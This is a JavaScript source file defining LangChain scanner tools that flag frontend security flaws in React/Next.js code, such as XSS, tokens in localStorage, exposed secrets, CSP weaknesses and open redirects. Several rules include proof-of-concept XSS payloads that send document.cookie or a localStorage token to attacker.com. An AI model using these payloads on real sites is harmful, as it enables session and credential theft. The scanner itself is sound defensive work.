/**
 * FRONTEND SECURITY TOOLS
 * Targets Next.js / React / Vue specific vulnerabilities:
 * XSS, CSP misconfiguration, insecure localStorage, JWT in localStorage,
 * exposed env vars, source maps in production, DOM-based XSS.
 */

'use strict';

const { DynamicStructuredTool } = require('@langchain/core/tools');
const { z } = require('zod');

const FRONTEND_PATTERNS = [
  // ── React XSS ────────────────────────────────────────────────────────────
  {
    id: 'FE-XSS-001', category: 'XSS', severity: 'HIGH',
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{__html\s*:/g,
    description: 'dangerouslySetInnerHTML usage — verify content is sanitized with DOMPurify',
    cwe: 'CWE-79', owasp: 'A03:2021',
    poc: '<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
    fix: 'Sanitize with DOMPurify: dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userContent)}}',
  },
  {
    id: 'FE-XSS-002', category: 'XSS', severity: 'HIGH',
    pattern: /innerHTML\s*=\s*(?!['"`])/g,
    description: 'Direct innerHTML assignment with dynamic content — DOM XSS',
    cwe: 'CWE-79', owasp: 'A03:2021',
    poc: 'Set innerHTML to <script>document.location=\'https://attacker.com?c=\'+document.cookie</script>',
    fix: 'Use textContent instead: element.textContent = userInput',
  },
  {
    id: 'FE-XSS-003', category: 'XSS', severity: 'MEDIUM',
    pattern: /href\s*=\s*\{[^}]*(?:user|input|param|query|props\.|state\.)/g,
    description: 'Dynamic href with user data — javascript: URL injection possible',
    cwe: 'CWE-83', owasp: 'A03:2021',
    poc: '<a href="javascript:alert(document.cookie)">Click me</a>',
    fix: 'Validate URL protocol: if (!url.startsWith("https://")) return "#"',
  },

  // ── Sensitive Data in localStorage ───────────────────────────────────────
  {
    id: 'FE-STOR-001', category: 'Insecure Storage', severity: 'HIGH',
    pattern: /localStorage\s*\.\s*setItem\s*\([^)]*(?:token|jwt|password|secret|key|auth)/gi,
    description: 'JWT/token stored in localStorage — XSS can steal it',
    cwe: 'CWE-312', owasp: 'A02:2021',
    poc: 'XSS payload: fetch("https://attacker.com?t="+localStorage.getItem("token"))',
    fix: 'Store tokens in httpOnly, Secure, SameSite=Strict cookies instead of localStorage',
  },
  {
    id: 'FE-STOR-002', category: 'Insecure Storage', severity: 'MEDIUM',
    pattern: /sessionStorage\s*\.\s*setItem\s*\([^)]*(?:password|secret|key|private)/gi,
    description: 'Sensitive data in sessionStorage — accessible to same-origin scripts (XSS)',
    cwe: 'CWE-312', owasp: 'A02:2021',
    poc: 'Any XSS on the same origin can read all sessionStorage values',
    fix: 'Never store credentials in Web Storage. Use server-side sessions.',
  },

  // ── Exposed Environment Variables ─────────────────────────────────────────
  {
    id: 'FE-ENV-001', category: 'Sensitive Data Exposure', severity: 'CRITICAL',
    pattern: /NEXT_PUBLIC_(?:API_SECRET|DB_|PRIVATE_KEY|JWT_SECRET|AUTH_SECRET)\b/g,
    description: 'NEXT_PUBLIC_ prefix exposes secret to browser bundle — never use for secrets',
    cwe: 'CWE-200', owasp: 'A02:2021',
    poc: 'View page source or bundle.js — all NEXT_PUBLIC_ variables are fully exposed',
    fix: 'Remove NEXT_PUBLIC_ prefix for secrets. Access them only in API routes (server-side).',
  },
  {
    id: 'FE-ENV-002', category: 'Sensitive Data Exposure', severity: 'HIGH',
    pattern: /process\.env\.[A-Z_]+(?:SECRET|KEY|TOKEN|PASSWORD)\b(?![\s\S]{0,200}process\.env\.NODE_ENV\s*!==\s*'production')/g,
    description: 'Server env secret potentially leaked to client bundle',
    cwe: 'CWE-200', owasp: 'A02:2021',
    poc: 'Secrets appear in JavaScript bundles served to all visitors',
    fix: 'Only access process.env secrets in API routes/getServerSideProps (server context)',
  },

  // ── Source Maps in Production ─────────────────────────────────────────────
  {
    id: 'FE-SRCP-001', category: 'Information Leakage', severity: 'MEDIUM',
    pattern: /productionSourceMaps?\s*:\s*true/gi,
    description: 'Source maps enabled in production — reveals original source code',
    cwe: 'CWE-540', owasp: 'A05:2021',
    poc: 'Chrome DevTools shows original TypeScript/React source, business logic, comments',
    fix: 'Set productionBrowserSourceMaps: false in next.config.js',
  },
  {
    id: 'FE-SRCP-002', category: 'Information Leakage', severity: 'MEDIUM',
    pattern: /sourcemap\s*:\s*true/gi,
    description: 'Sourcemap generation enabled — may be bundled to production',
    cwe: 'CWE-540', owasp: 'A05:2021',
    poc: 'Source maps expose internal file structure and unminified logic',
    fix: 'Disable sourcemaps in production build config',
  },

  // ── CSP Misconfiguration ──────────────────────────────────────────────────
  {
    id: 'FE-CSP-001', category: 'Security Misconfiguration', severity: 'HIGH',
    pattern: /(?:Content-Security-Policy|contentSecurityPolicy)[^"'\n]*unsafe-inline/gi,
    description: "CSP includes 'unsafe-inline' — negates XSS protection",
    cwe: 'CWE-693', owasp: 'A05:2021',
    poc: 'Inline scripts execute despite CSP, allowing XSS attacks',
    fix: "Remove 'unsafe-inline'. Use nonces: script-src 'nonce-{random}'",
  },
  {
    id: 'FE-CSP-002', category: 'Security Misconfiguration', severity: 'HIGH',
    pattern: /(?:Content-Security-Policy|contentSecurityPolicy)[^"'\n]*unsafe-eval/gi,
    description: "CSP includes 'unsafe-eval' — allows eval()-based XSS payloads",
    cwe: 'CWE-693', owasp: 'A05:2021',
    poc: "CSP bypass: eval('fetch(attacker.com?c='+document.cookie)')",
    fix: "Remove 'unsafe-eval'. Refactor code that uses eval/Function.",
  },
  {
    id: 'FE-CSP-003', category: 'Security Misconfiguration', severity: 'MEDIUM',
    pattern: /(?:Content-Security-Policy)[^"'\n]*\*/gi,
    description: "CSP uses wildcard (*) sources — defeats purpose of CSP",
    cwe: 'CWE-693', owasp: 'A05:2021',
    poc: 'Scripts/styles can be loaded from any domain',
    fix: 'Specify explicit trusted origins: script-src https://cdn.trusted.com',
  },

  // ── URL / Open Redirect (Frontend) ───────────────────────────────────────
  {
    id: 'FE-REDIR-001', category: 'Open Redirect', severity: 'MEDIUM',
    pattern: /(?:router\.push|window\.location|location\.href)\s*=?\s*(?:.*(?:query\.|searchParams\.|params\.))/g,
    description: 'Frontend redirect using URL parameter — open redirect risk',
    cwe: 'CWE-601', owasp: 'A01:2021',
    poc: '?redirect=https://phishing-site.com — trusted redirect to external site',
    fix: 'Validate redirect stays on same origin: if (!url.startsWith("/")) url = "/dashboard"',
  },

  // ── React prop-types / input validation ──────────────────────────────────
  {
    id: 'FE-EVAL-001', category: 'Code Injection', severity: 'HIGH',
    pattern: /eval\s*\(\s*(?:props\.|state\.|data\.|userInput)/g,
    description: 'eval() called with data from props/state — XSS/RCE via component injection',
    cwe: 'CWE-95', owasp: 'A03:2021',
    poc: 'Pass malicious string through props to trigger eval() execution',
    fix: 'Never use eval(). Replace with safe alternatives specific to the use case.',
  },

  // ── Hardcoded API keys in frontend ───────────────────────────────────────
  {
    id: 'FE-KEY-001', category: 'Hardcoded Secret', severity: 'HIGH',
    pattern: /(?:apiKey|api_key|authToken|authKey)\s*[=:]\s*['"][a-zA-Z0-9]{20,}['"]/g,
    description: 'API key hardcoded in frontend code — visible in browser bundle',
    cwe: 'CWE-798', owasp: 'A02:2021',
    poc: 'View bundle.js in DevTools to extract hardcoded API key',
    fix: 'Use environment variables accessed via server-side API routes only',
  },
];

function getLineNumber(content, index) {
  return content.substring(0, index).split('\n').length;
}
function getLineContent(content, lineNum) {
  return (content.split('\n')[lineNum - 1] || '').trim().slice(0, 140);
}

const frontendSecurityScanTool = new DynamicStructuredTool({
  name: 'frontend_security_scan',
  description: 'Scan React/Next.js/Vue frontend files for XSS, CSP issues, insecure localStorage, exposed secrets, source maps, and DOM-based vulnerabilities.',
  schema: z.object({ filePath: z.string(), content: z.string() }),
  func: async ({ filePath, content }) => {
    const findings = [];
    for (const vuln of FRONTEND_PATTERNS) {
      const regex = new RegExp(vuln.pattern.source, vuln.pattern.flags);
      let match;
      while ((match = regex.exec(content)) !== null) {
        const lineNum = getLineNumber(content, match.index);
        findings.push({
          ruleId: vuln.id, category: vuln.category, severity: vuln.severity,
          description: vuln.description, cwe: vuln.cwe, owasp: vuln.owasp,
          poc: vuln.poc || '', fix: vuln.fix || '',
          file: filePath, line: lineNum,
          snippet: getLineContent(content, lineNum),
          match: match[0].slice(0, 120),
          source: 'Frontend Security',
        });
      }
    }
    return JSON.stringify({ file: filePath, findingsCount: findings.length, findings });
  },
});

// ─── Check Next.js config for security issues ────────────────────────────────
const nextjsConfigAuditTool = new DynamicStructuredTool({
  name: 'nextjs_config_audit',
  description: 'Audit Next.js configuration files for security misconfigurations.',
  schema: z.object({ files: z.array(z.object({ filePath: z.string(), content: z.string() })) }),
  func: async ({ files }) => {
    const issues = [];
    const configFiles = files.filter(f => /next\.config\.[jt]s?$/.test(f.filePath));

    for (const file of configFiles) {
      const c = file.content;

      if (!c.includes('securityHeaders') && !c.includes('Content-Security-Policy')) {
        issues.push({ file: file.filePath, severity: 'HIGH', category: 'Missing Security Headers', description: 'No security headers configured in next.config.js', fix: 'Add headers() with Content-Security-Policy, HSTS, X-Frame-Options, etc.', source: 'Frontend Security', cwe: 'CWE-693', owasp: 'A05:2021' });
      }
      if (c.includes('productionBrowserSourceMaps: true')) {
        issues.push({ file: file.filePath, severity: 'MEDIUM', category: 'Information Leakage', description: 'productionBrowserSourceMaps is true — source code exposed', fix: 'Set productionBrowserSourceMaps: false', source: 'Frontend Security', cwe: 'CWE-540', owasp: 'A05:2021' });
      }
      if (/allowedOrigins\s*:\s*\[['"`]\*['"`]\]/.test(c)) {
        issues.push({ file: file.filePath, severity: 'HIGH', category: 'Security Misconfiguration', description: 'allowedOrigins set to wildcard — CORS bypass', fix: 'Specify exact frontend origin in allowedOrigins', source: 'Frontend Security', cwe: 'CWE-942', owasp: 'A05:2021' });
      }
    }
    return JSON.stringify({ issues });
  },
});

module.exports = { frontendSecurityScanTool, nextjsConfigAuditTool, FRONTEND_PATTERNS };
